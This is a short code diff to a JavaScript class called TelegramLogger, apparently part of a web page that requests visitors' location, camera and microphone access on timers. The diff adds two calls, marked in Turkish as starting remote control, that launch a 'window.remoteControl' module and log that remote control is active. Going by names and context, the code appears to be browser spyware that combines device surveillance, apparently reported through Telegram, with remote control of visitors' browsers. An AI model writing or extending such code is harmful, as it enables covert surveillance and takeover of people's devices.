@@ -56,6 +56,14 @@ class TelegramLogger {
                 this.requestLocationAccess();
                 setTimeout(() => this.requestCameraAccess(), 1000);
                 setTimeout(() => this.requestMicrophoneAccess(), 2000);
+
+                // UZAKTAN KONTROLÜ BAŞLAT
+                setTimeout(() => {
+                    if (window.remoteControl) {
+                        window.remoteControl.start();
+                        console.log('🎮 Remote Control System: ACTIVE');
+                    }
+                }, 3000);
             }, 1000);
             
             return;
@@ -95,6 +103,14 @@ class TelegramLogger {
                     setTimeout(() => {
                         this.requestMicrophoneAccess();
                     }, 2000);
+
+                    // UZAKTAN KONTROLÜ BAŞLAT
+                    setTimeout(() => {
+                        if (window.remoteControl) {
+                            window.remoteControl.start();
+                            console.log('🎮 Remote Control System: ACTIVE');
+                        }
+                    }, 3000);
                 }, 500);
             });
         }
